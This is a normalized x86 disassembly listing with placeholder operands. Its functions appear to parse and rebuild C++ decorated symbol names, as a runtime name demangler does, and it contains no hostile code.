mov ecx [ ebp + 0x8 ]
test al al
je r-xdata
push 0x1
cmp al 0x41
je r-xdata
inc [ rwxdata ]
push r--data
call sub_422704
jmp r-xdata
push 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
call sub_422338
sub_422b18
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_422929
mov eax esi
pop esi
pop ebp
retn 0x8
sub_422b3c
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_42296c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_422b60
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ebx
mov ebx [ ebp + 0x8 ]
test bl bl
je r-xdata
pop ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push 0x8
mov ecx rwxdata
call sub_421d93
test eax eax
je r-xdata
push ebx
call sub_4229d3
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] bl
jmp r-xdata
push eax
mov ecx esi
call sub_4223d5
sub_422bb2
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x1
jg r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
je r-xdata
pop esi
pop ebx
cmp [ esi ] bl
je r-xdata
cmp [ edi ] ebx
jne r-xdata
push ebx
push 0xc
mov ecx rwxdata
call sub_421d93
cmp eax ebx
je r-xdata
push esi
call sub_422a00
jmp r-xdata
xor eax eax
xor edx edx
cmp [ esi ] bl
je r-xdata
push edx
push esi
mov ecx eax
call sub_422522
jmp r-xdata
inc edx
cmp [ edx + esi ] bl
jne r-xdata
push eax
mov ecx edi
call sub_4223d5
sub_422c16
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ ebp - 0x4 ] 0x1
mov [ esi ] ebx
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
push edi
pop edi
cmp al 0x5a
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_422b60
mov [ ebp - 0x4 ] ebx
jmp r-xdata
push 0x1
mov ecx esi
call sub_422619
movsx eax al
sub eax 0x30
cmp eax 0x9
ja r-xdata
mov edi [ rwxdata ]
mov al [ edi ]
cmp al bl
je r-xdata
and [ ebp - 0x8 ] 0xffff0000
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0xc ] ebx
call sub_426811
mov eax [ rwxdata ]
sub eax edi
cmp eax 0x1
pop ecx
pop ecx
jle r-xdata
mov ecx [ rwxdata ]
push eax
lea eax [ ebp - 0x1c ]
inc edi
push eax
mov [ rwxdata ] edi
call sub_4224e2
push eax
mov ecx esi
call sub_422929
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
call sub_422929
cmp [ rwxdata ] edi
jne r-xdata
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
cmp [ esi + 0x4 ] bl
je r-xdata
push 0x2
mov ecx esi
call sub_422461
lea eax [ ebp - 0x14 ]
push eax
call sub_422498
mov eax [ rwxdata ]
mov al [ eax ]
cmp al 0x40
je r-xdata
jmp r-xdata
sub_422d18
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
push r--data
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_422bb2
lea eax [ ebp - 0x8 ]
push eax
call sub_42561a
pop ecx
push eax
mov ecx esi
call sub_422929
push 0x7d
mov ecx esi
call sub_422b60
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
mov eax esi
pop esi
leave
retn
inc [ rwxdata ]
sub_422d6c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4226d7
mov ecx eax
call sub_422b18
mov eax [ ebp + 0x8 ]
leave
retn
sub_422d90
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422338
mov ecx eax
call sub_422b18
mov eax [ ebp + 0x8 ]
leave
retn
sub_422db4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422704
mov ecx eax
call sub_422b18
mov eax [ ebp + 0x8 ]
leave
retn
sub_422dd8
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_422b60
mov eax esi
pop esi
pop ebp
retn 0x8
sub_422dfc
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_422bb2
mov eax esi
pop esi
pop ebp
retn 0x8
sub_422e20
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ rwxdata ]
xor ecx ecx
cmp [ esi ] 0x51
mov [ ebp - 0x4 ] ecx
jne r-xdata
mov al [ esi ]
cmp al cl
jne r-xdata
inc esi
mov [ ebp - 0x4 ] r--data
mov [ rwxdata ] esi
cmp al 0x30
jl r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_422338
mov eax [ ebp + 0x8 ]
jmp r-xdata
push ebx
push edi
xor edi edi
jmp r-xdata
cmp al 0x39
jg r-xdata
pop esi
leave
retn
cmp al 0x40
jne r-xdata
movsx eax [ esi ]
sub eax 0x2f
cdq
inc esi
push edx
mov [ rwxdata ] esi
push eax
cmp [ ebp - 0x4 ] ecx
je r-xdata
test al al
je r-xdata
mov al [ esi ]
inc esi
mov [ rwxdata ] esi
cmp al 0x40
je r-xdata
lea ecx [ ebp - 0x1c ]
call sub_4227fc
lea ecx [ ebp - 0xc ]
call sub_4227fc
push eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push eax
call sub_422db4
add esp 0xc
jmp r-xdata
push 0x1
jmp r-xdata
cmp al 0x41
jl r-xdata
xor eax eax
push edi
push ecx
cmp [ ebp + 0xc ] al
je r-xdata
push 0x2
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp al 0x50
jg r-xdata
cmp [ ebp - 0x4 ] eax
je r-xdata
cmp [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop ebx
movsx eax al
sub eax 0x41
push 0x0
cdq
push 0x10
mov ebx eax
push edi
mov eax edx
push ecx
mov [ ebp - 0x8 ] eax
call sub_428730
add ebx eax
mov eax [ ebp - 0x8 ]
adc eax edx
inc esi
mov edi eax
mov [ rwxdata ] esi
mov al [ esi ]
mov ecx ebx
lea ecx [ ebp - 0xc ]
call sub_4227fc
lea ecx [ ebp - 0x1c ]
call sub_4227fc
lea ecx [ ebp - 0xc ]
call sub_42286a
jmp r-xdata
lea ecx [ ebp - 0x1c ]
call sub_42286a
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
push eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push eax
call sub_422db4
add esp 0xc
jmp r-xdata
sub_422f72
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
mov al [ eax ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0xffff0000
test al al
je r-xdata
push 0x1
movsx eax al
add eax 0xffffffd0
cmp eax 0x7
ja r-xdata
push 0x2
jmp r-xdata
jmp [ eax * 4 + jump_table_423026 ]
mov ecx [ ebp + 0x8 ]
call sub_422338
mov eax [ ebp + 0x8 ]
leave
retn
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov eax [ rwxdata ]
movsx eax [ eax ]
inc [ rwxdata ]
sub eax 0x31
je r-xdata
lea ecx [ ebp - 0x8 ]
call sub_422a00
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
add esp 0xc
jmp r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
leave
retn
dec eax
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
sub_423046
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
movsx eax [ eax ]
sub esp 0x10
sub eax 0x58
je r-xdata
inc [ rwxdata ]
push r--data
dec eax
dec eax
je r-xdata
mov eax [ rwxdata ]
inc [ rwxdata ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_422c16
pop ecx
mov ecx [ ebp - 0x4 ]
test cl cl
jne r-xdata
push eax
jmp r-xdata
mov eax r--data
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
leave
retn
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422704
cmp al 0x40
je r-xdata
inc [ rwxdata ]
cmp al 0x5a
je r-xdata
mov eax [ rwxdata ]
inc [ rwxdata ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_422338
jmp r-xdata
push eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422dfc
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
leave
retn
mov eax r--data
mov eax [ ebp + 0x8 ]
leave
retn
sub_423122
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov al [ eax ]
sub esp 0x10
test al al
je r-xdata
push 0x29
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push r--data
lea ecx [ ebp - 0x8 ]
call sub_422704
mov ecx eax
call sub_422905
cmp al 0x5a
jne r-xdata
push 0x29
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
call sub_423046
push eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call sub_422db4
add esp 0x10
jmp r-xdata
inc [ rwxdata ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
and edx 0xffff0000
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
leave
retn
mov ecx eax
call sub_422dd8
mov eax [ ebp + 0x8 ]
leave
retn
sub_4231a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
and [ ebp - 0x4 ] 0xffff0000
push ebx
push edi
mov edi [ rwxdata ]
xor ebx ebx
inc edi
mov [ rwxdata ] edi
mov cl [ edi ]
movsx eax cl
mov edx eax
sub edx 0x41
mov [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edx
je r-xdata
mov eax [ ebp + 0x8 ]
inc [ rwxdata ]
mov [ eax + 0x4 ] bl
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x26
setne cl
dec cl
and cl 0xc7
add cl 0x5e
mov [ eax ] cl
cmp [ ebp + 0x14 ] ebx
je r-xdata
dec edx
je r-xdata
mov eax [ ebp + 0x10 ]
push 0x3e
lea ecx [ ebp - 0x8 ]
mov [ eax ] 0x1
call sub_4229d3
jmp r-xdata
push 0x2
mov eax [ ebp + 0xc ]
mov [ eax ] 0x25
jmp r-xdata
cmp cl bl
je r-xdata
pop edi
pop ebx
leave
retn
push 0x1
jmp r-xdata
mov cl [ edi + 0x1 ]
cmp cl bl
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
add eax 0xffffffd0
shl eax 0x4
movsx ecx cl
inc edi
push esi
lea esi [ eax + ecx - 0x30 ]
inc edi
mov [ rwxdata ] edi
cmp esi 0x1
jbe r-xdata
push 0x3e
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422dd8
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ rwxdata ]
cmp [ eax ] 0x24
mov [ ebp - 0x4 ] ecx
pop esi
jne r-xdata
push 0x2c
lea ecx [ ebp - 0x8 ]
call sub_4229d3
push ebx
push esi
lea ecx [ ebp - 0x10 ]
call sub_4227fc
push eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422b18
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
push 0x5e
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422dd8
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
inc [ rwxdata ]
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_422619
mov ecx [ ebp - 0x4 ]
inc [ rwxdata ]
jmp r-xdata
mov eax [ rwxdata ]
cmp [ eax ] bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
or ecx 0x4000
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_42331e
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
sub esp 0x30
push ebx
xor ebx ebx
cmp [ eax ] bl
je r-xdata
mov eax [ ebp + 0xc ]
push 0x5d
cmp [ eax ] ebx
je r-xdata
call sub_421752
cmp eax ebx
mov [ ebp - 0x4 ] eax
jge r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x20 ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1
lea ecx [ ebp - 0x28 ]
push ecx
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
push eax
lea eax [ ebp - 0x18 ]
push 0x28
push eax
call sub_422d6c
add esp 0xc
mov ecx eax
call sub_422dfc
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx eax
call sub_422905
mov ecx eax
call sub_422dd8
push eax
push [ ebp + 0x8 ]
call sub_42645a
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
and [ ebp - 0xc ] 0xffff0000
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi 0x800
mov [ ebp - 0x10 ] ebx
test [ edi + 0x4 ] esi
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x5d
push eax
lea eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
push r--data
lea ecx [ ebp - 0x10 ]
call sub_422bb2
jmp r-xdata
push 0x1
push eax
push 0x5b
call sub_4226d7
mov eax [ ebp - 0x4 ]
dec [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ edi ] ebx
je r-xdata
mov eax [ rwxdata ]
cmp [ eax ] bl
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_426811
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
or ecx esi
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
test [ edi + 0x4 ] esi
je r-xdata
push 0x5d
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push ebx
push eax
call sub_422e20
push eax
lea eax [ ebp - 0x30 ]
push 0x5b
push eax
call sub_422d6c
add esp 0x14
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
pop ebx
leave
retn
push 0x29
lea eax [ ebp - 0x28 ]
push eax
push edi
lea eax [ ebp - 0x20 ]
push 0x28
push eax
call sub_422d6c
add esp 0xc
mov ecx eax
call sub_422dd8
mov ecx eax
mov ecx edi
jmp r-xdata
call sub_422b18
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
sub_423498
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x27
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call sub_422e20
push eax
lea eax [ ebp - 0x10 ]
push 0x60
push eax
call sub_422d6c
add esp 0x14
mov ecx eax
call sub_422dd8
mov eax [ ebp + 0x8 ]
leave
retn
sub_42350d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
inc ebx
cmp al bl
mov [ esi + 0x4 ] eax
jg r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ rwxdata ]
cmp [ ecx ] 0x0
je r-xdata
cmp al bl
jg r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_42222c
pop ecx
push esi
lea eax [ ebp - 0x10 ]
push eax
push 0x20
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422dd8
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
cmp [ esi + 0x4 ] bl
jg r-xdata
push esi
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_422d90
add esp 0xc
push eax
mov ecx esi
call sub_421f4a
mov eax [ rwxdata ]
cmp [ eax ] 0x40
je r-xdata
inc [ rwxdata ]
jmp r-xdata
push r--data
jmp r-xdata
mov ecx esi
call sub_422bb2
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jg r-xdata
cmp al 0x40
je r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x0
jne r-xdata
push 0x27
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42561a
push eax
lea eax [ ebp - 0x8 ]
push 0x60
push eax
call sub_422d6c
add esp 0x10
mov ecx eax
call sub_422dd8
push eax
mov ecx esi
call sub_422929
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
push 0x7d
mov ecx esi
call sub_422b60
push ebx
mov ecx esi
call sub_422619
cmp [ esi + 0x4 ] bl
jg r-xdata
inc eax
mov [ rwxdata ] eax
cmp [ eax ] 0x40
je r-xdata
cmp [ esi + 0x4 ] bl
jle r-xdata
push r--data
sub_423644
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
call sub_422704
mov eax [ rwxdata ]
mov al [ eax ]
inc [ rwxdata ]
cmp al 0x40
jne r-xdata
push 0x2
mov eax [ rwxdata ]
mov al [ eax ]
inc [ rwxdata ]
cmp al 0x5f
jne r-xdata
inc [ rwxdata ]
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_422e20
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_422e20
mov eax [ rwxdata ]
mov cl [ eax ]
add esp 0x10
test cl cl
je r-xdata
dec eax
mov [ rwxdata ] eax
push 0x1
jmp r-xdata
cmp cl 0x40
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
mov eax [ ebp + 0x8 ]
leave
retn
cmp [ eax ] 0x0
jne r-xdata
inc eax
mov [ rwxdata ] eax
mov cl [ eax ]
test cl cl
jne r-xdata
mov ecx [ ebp - 0x8 ]
inc eax
mov [ rwxdata ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_4236e8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
mov al [ eax ]
test al al
jne r-xdata
push 0x0
cmp al 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_422338
jmp r-xdata
push [ ebp + 0x8 ]
call sub_422e20
pop ecx
pop ecx
inc [ rwxdata ]
lea eax [ ebp - 0x8 ]
push eax
call sub_422e20
push eax
push 0x2d
push [ ebp + 0x8 ]
call sub_422d6c
add esp 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn
sub_42373a
mov edi edi
push ebp
mov ebp esp
sub esp 0xd0
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
push ebx
mov bl [ eax ]
inc [ rwxdata ]
push esi
movsx esi bl
cmp esi 0x44
push edi
mov edi [ ebp + 0x8 ]
jg r-xdata
cmp esi 0x45
je r-xdata
je r-xdata
push edi
call sub_425402
jle r-xdata
lea eax [ ebp - 0x80 ]
push eax
call sub_4236e8
test [ rwxdata ] 0x4000
pop ecx
je r-xdata
sub esi 0x0
je r-xdata
push 0x2
cmp esi 0x4a
jle r-xdata
push r--data
lea eax [ ebp - 0x80 ]
push edi
push eax
cmp bl 0x44
jne r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_42237d
lea eax [ ebp - 0x14 ]
push eax
call sub_4280c3
push eax
call [ rwxdata ]
pop ecx
pop ecx
test eax eax
je r-xdata
dec [ rwxdata ]
sub esi 0x30
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
push 0x7b
lea ecx [ ebp - 0x80 ]
call sub_4226d7
cmp bl 0x48
jl r-xdata
cmp esi 0x51
je r-xdata
push r--data
lea eax [ ebp - 0xc8 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x88 ]
push eax
jmp r-xdata
mov ecx edi
call sub_422338
jmp r-xdata
push edi
call sub_4236e8
jmp r-xdata
dec esi
je r-xdata
sub esi 0x46
je r-xdata
cmp bl 0x4a
jg r-xdata
cmp esi 0x52
jne r-xdata
push eax
call sub_422db4
add esp 0xc
mov ecx eax
call sub_422dfc
jmp r-xdata
mov ecx edi
call sub_422704
jmp r-xdata
pop ecx
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
dec esi
jne r-xdata
lea eax [ ebp - 0xb0 ]
push eax
call sub_4236e8
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_422929
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_422b60
dec esi
je r-xdata
lea eax [ ebp - 0x90 ]
push eax
call sub_425402
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_422929
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_422b60
push 0x0
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_4243a4
lea eax [ ebp - 0x80 ]
push eax
call sub_4236e8
mov eax [ ebp - 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
add esp 0x10
mov [ edi + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x98 ]
push eax
call sub_425402
pop ecx
push eax
push edi
push r--data
lea ecx [ ebp - 0xb8 ]
call sub_422704
jmp r-xdata
inc [ rwxdata ]
push r--data
lea eax [ ebp - 0x80 ]
push eax
call sub_4236e8
lea eax [ ebp - 0xc ]
push eax
call sub_4236e8
cmp [ ebp - 0x7c ] 0x1
pop ecx
pop ecx
jg r-xdata
lea eax [ ebp - 0xa0 ]
push eax
call sub_4236e8
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_422929
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_422b60
dec esi
je r-xdata
mov ecx eax
call sub_422b18
jmp r-xdata
push 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1
jg r-xdata
lea eax [ ebp - 0xc0 ]
push eax
call sub_4236e8
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_422929
dec esi
je r-xdata
push 0x64
lea eax [ ebp - 0x77 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_42237d
test eax eax
jne r-xdata
dec esi
jne r-xdata
mov al [ ebp - 0x77 ]
mov [ ebp - 0x78 ] al
cmp al 0x2d
jne r-xdata
push 0x7d
push edi
lea ecx [ ebp - 0x80 ]
call sub_422dd8
jmp r-xdata
mov [ ebp - 0x77 ] 0x2e
mov al [ ebp - 0x76 ]
mov [ ebp - 0x77 ] al
mov [ ebp - 0x76 ] 0x2e
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
push 0x65
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0xd0 ]
call sub_422704
mov ecx eax
call sub_422dd8
sub_423a07
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
xor ecx ecx
sub esp 0x10
cmp [ eax ] cl
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
cmp [ ebp + 0x10 ] ecx
je r-xdata
cmp [ eax ] 0x59
jne r-xdata
cmp [ eax ] 0x58
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push esi
push eax
call sub_42645a
mov eax [ esi + 0x4 ]
pop ecx
pop ecx
pop esi
test eax 0x4000
je r-xdata
push [ ebp + 0xc ]
inc eax
push [ ebp + 0x8 ]
mov [ rwxdata ] eax
call sub_42331e
pop ecx
pop ecx
jmp r-xdata
inc eax
mov [ rwxdata ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] ecx
jne r-xdata
test eax 0x2000
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push r--data
mov eax [ ebp + 0x8 ]
leave
retn
push eax
push r--data
push [ ebp + 0x8 ]
call sub_422db4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_422704
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push r--data
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
leave
retn
add esp 0xc
lea eax [ ebp - 0x10 ]
push eax
call sub_422db4
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
jmp r-xdata
sub_423afc
mov edi edi
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
mov [ rwxdata ] 0x1
mov [ ebp - 0x20 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
mov [ rwxdata ] bl
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
push edi
mov edi 0xffff0000
pop edi
cmp cl 0x40
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_422b60
mov eax [ rwxdata ]
mov [ ebp - 0x20 ] ebx
jmp r-xdata
and [ ebp - 0x18 ] edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x1c ] ebx
cmp dl 0x58
jne r-xdata
inc eax
mov [ rwxdata ] eax
push ecx
mov ecx [ rwxdata ]
lea eax [ ebp - 0x6c ]
push eax
call sub_4224e2
jmp r-xdata
mov dl [ eax ]
movsx ecx dl
sub ecx 0x30
cmp ecx 0x9
ja r-xdata
cmp dl 0x24
jne r-xdata
inc eax
mov [ rwxdata ] eax
push r--data
push eax
mov ecx esi
call sub_422929
cmp [ esi + 0x4 ] bl
je r-xdata
cmp dl 0x3f
jne r-xdata
inc eax
cmp [ eax ] dl
je r-xdata
mov eax [ rwxdata ]
sub eax [ ebp - 0x34 ]
cmp eax 0x1
